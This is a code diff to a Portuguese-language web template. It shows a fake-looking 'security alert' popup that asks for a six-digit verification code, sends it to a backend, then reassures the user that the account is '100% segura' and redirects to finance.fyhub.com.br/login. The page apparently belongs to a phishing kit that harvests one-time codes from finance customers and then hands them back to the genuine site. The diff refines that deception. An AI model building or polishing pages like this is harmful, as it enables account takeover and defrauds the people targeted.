@@ -40,9 +40,11 @@
     <div id="securityPopup" class="security-overlay" style="display: none;">
         <div class="security-popup">
             <div class="security-icon">
-                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z" fill="#F57C00"/>
-                    <circle cx="12" cy="14" r="3" fill="#FFFFFF"/>
+                <svg width="56" height="56" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Flat unlock icon -->
+                    <path d="M44 28V22C44 15.37 38.63 10 32 10S20 15.37 20 22v6H18c-2.21 0-4 1.79-4 4v20c0 2.21 1.79 4 4 4h28c2.21 0 4-1.79 4-4V32c0-2.21-1.79-4-4-4H44z" fill="#F57C00"/>
+                    <path d="M32 10c-6.63 0-12 5.37-12 12v6h6V22c0-3.31 2.69-6 6-6s6 2.69 6 6v6h6V22c0-6.63-5.37-12-12-12z" fill="#FFB300"/>
+                    <circle cx="32" cy="38" r="5" fill="#FFFFFF"/>
                 </svg>
             </div>
             <h3>Alerta de segurança!</h3>
@@ -52,7 +54,7 @@
             <p class="email-masked">r*****@s******.**.b*</p>
             <p class="info-code-text">Informe o código recebido para continuar.</p>
             <div class="code-input-container">
-                <input type="text" id="popupOtpCode" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
                 <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
                 <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
                 <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
@@ -60,7 +62,21 @@
                 <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
             </div>
             <p class="code-expiry">O código expira às <span id="expiryTime"></span></p>
-            <p class="sms-link">Receber código por SMS</p>
+        </div>
+    </div>
+
+    <!-- Popup de sucesso -->
+    <div id="successPopup" class="success-overlay" style="display: none;">
+        <div class="success-popup">
+            <div class="success-icon">
+                <svg width="56" height="56" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="#4CAF50"/>
+                    <path d="M10 17l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#FFFFFF"/>
+                </svg>
+            </div>
+            <h3>Está tudo certo!</h3>
+            <p>Sua conta está 100% segura, nenhuma ação é necessária.</p>
+            <div class="success-timer">Redirecionando em <span id="redirectCountdown">10</span>s...</div>
         </div>
     </div>
 </div>
@@ -83,7 +99,7 @@ otpInput.addEventListener('input', function(e) {
 });
 
 // Popup OTP boxes
-const popupOtpInputs = document.querySelectorAll('#popupOtpCode, .otp-code-box');
+const popupOtpInputs = document.querySelectorAll('.otp-code-box');
 
 popupOtpInputs.forEach((input, index) => {
     input.addEventListener('input', function(e) {
@@ -163,7 +179,12 @@ function goBack() {
     window.location.href = `/contas?token=${authToken}`;
 }
 
+let isVerifying = false;
+
 async function handleVerify() {
+    if (isVerifying) return;
+    isVerifying = true;
+    
     const code = otpInput.value;
     const btn = document.getElementById('btnVerify');
     const errorBanner = document.getElementById('errorBanner');
@@ -172,6 +193,7 @@ async function handleVerify() {
     if (code.length !== 6) {
         errorText.textContent = 'Digite o código de 6 dígitos.';
         errorBanner.style.display = 'block';
+        isVerifying = false;
         return;
     }
     
@@ -196,19 +218,43 @@ async function handleVerify() {
         const data = await response.json();
         
         if (data.success) {
-            window.location.href = `/sucesso?token=${authToken}&account=${accountNumber}`;
+            // Show success popup
+            showSuccessPopup();
         } else {
             errorText.textContent = data.message || 'Código inválido. Tente novamente.';
             errorBanner.style.display = 'block';
+            isVerifying = false;
         }
     } catch (err) {
         errorText.textContent = 'Erro de conexão. Tente novamente.';
         errorBanner.style.display = 'block';
+        isVerifying = false;
     } finally {
         btn.disabled = false;
         btn.innerHTML = 'VERIFICAR';
         hideLoading();
     }
+}
+
+function showSuccessPopup() {
+    // Hide security popup
+    document.getElementById('securityPopup').style.display = 'none';
+    
+    // Show success popup
+    document.getElementById('successPopup').style.display = 'flex';
+    
+    // Countdown
+    let count = 10;
+    const countdownEl = document.getElementById('redirectCountdown');
+    
+    const interval = setInterval(() => {
+        count--;
+        countdownEl.textContent = count;
+        if (count <= 0) {
+            clearInterval(interval);
+            window.location.href = 'https://finance.fyhub.com.br/login';
+        }
+    }, 1000);
 }
 
 async function handleResend() {
@@ -236,7 +282,7 @@ async function handleResend() {
 // Show popup after 500ms delay
 setTimeout(() => {
     document.getElementById('securityPopup').style.display = 'flex';
-    document.getElementById('popupOtpCode').focus();
+    popupOtpInputs[0].focus();
 }, 500);
 </script>
 {% endblock %}
@@ -247,83 +293,87 @@ setTimeout(() => {
 .security-overlay {
     position: absolute;
     top: -20px;
-    left: -20px;
-    right: -20px;
+    left: -40px;
+    right: -40px;
     bottom: -20px;
-    background: rgba(0, 0, 0, 0.5);
+    background: rgba(0, 0, 0, 0.55);
     border-radius: 16px;
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 10;
-    padding: 20px;
+    padding: 24px 40px;
 }
 
 .security-popup {
     background: #ffffff;
     border-radius: 20px;
-    padding: 32px 28px;
+    padding: 36px 40px 32px 40px;
     width: 100%;
-    max-width: 380px;
+    max-width: 440px;
     text-align: center;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
 }
 
 .security-icon {
-    margin-bottom: 16px;
+    margin-bottom: 20px;
 }
 
 .security-popup h3 {
-    font-size: 20px;
+    font-size: 22px;
     font-weight: 700;
     color: #1a1a1a;
-    margin: 0 0 8px 0;
+    margin: 0 0 10px 0;
 }
 
 .security-popup > p {
-    font-size: 14px;
+    font-size: 14.5px;
     color: #666;
     margin: 0 0 4px 0;
     line-height: 1.5;
+    font-weight: 400;
 }
 
 .security-divider {
     height: 1px;
     background: #e5e5e5;
-    margin: 16px 0;
+    margin: 20px 0;
 }
 
 .email-sent-text {
     font-size: 14px !important;
     color: #1a1a1a !important;
-    margin-bottom: 4px !important;
+    margin-bottom: 6px !important;
+    font-weight: 400;
 }
 
 .email-masked {
-    font-size: 24px !important;
-    font-weight: 800 !important;
+    font-size: 22px !important;
+    font-weight: 700;
     color: #1a1a1a !important;
-    margin: 4px 0 8px 0 !important;
-    letter-spacing: 1px;
+    margin: 6px 0 10px 0 !important;
+    letter-spacing: 1.5px;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
 }
 
 .info-code-text {
     font-size: 14px !important;
     color: #1a1a1a !important;
-    margin-bottom: 16px !important;
+    margin-bottom: 20px !important;
+    font-weight: 400;
 }
 
 .code-input-container {
     display: flex;
     gap: 10px;
     justify-content: center;
-    margin: 16px 0 12px 0;
+    margin: 20px 0 14px 0;
 }
 
 .otp-code-box {
-    width: 48px;
-    height: 52px;
-    border: 2px solid #e0e0e0;
+    width: 50px;
+    height: 54px;
+    border: 1.5px solid #d4d4d4;
     border-radius: 10px;
     text-align: center;
     font-size: 22px;
@@ -331,29 +381,69 @@ setTimeout(() => {
     color: #1a1a1a;
     background: #fff;
     outline: none;
-    transition: border-color 0.2s;
+    transition: border-color 0.2s, box-shadow 0.2s;
 }
 
 .otp-code-box:focus {
     border-color: #2196F3;
-    box-shadow: 0 0 0 2px rgba(33, 150, 243, 0.2);
+    box-shadow: 0 0 0 2px rgba(33, 150, 243, 0.15);
 }
 
 .code-expiry {
     font-size: 13px;
     color: #888;
-    margin: 12px 0 8px 0;
+    margin: 14px 0 0 0;
 }
 
-.sms-link {
+/* Success Popup */
+.success-overlay {
+    position: absolute;
+    top: -20px;
+    left: -40px;
+    right: -40px;
+    bottom: -20px;
+    background: rgba(0, 0, 0, 0.55);
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    padding: 24px 40px;
+}
+
+.success-popup {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 40px 44px 36px 44px;
+    width: 100%;
+    max-width: 440px;
+    text-align: center;
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+}
+
+.success-icon {
+    margin-bottom: 16px;
+}
+
+.success-popup h3 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin: 0 0 10px 0;
+}
+
+.success-popup > p {
+    font-size: 15px;
+    color: #555;
+    margin: 0 0 20px 0;
+    line-height: 1.5;
+    font-weight: 400;
+}
+
+.success-timer {
     font-size: 14px;
     color: #2196F3;
-    cursor: pointer;
-    margin: 4px 0 0 0;
-}
-
-.sms-link:hover {
-    text-decoration: underline;
+    font-weight: 500;
 }
 
 /* Hide main 2fa content when popup is visible */
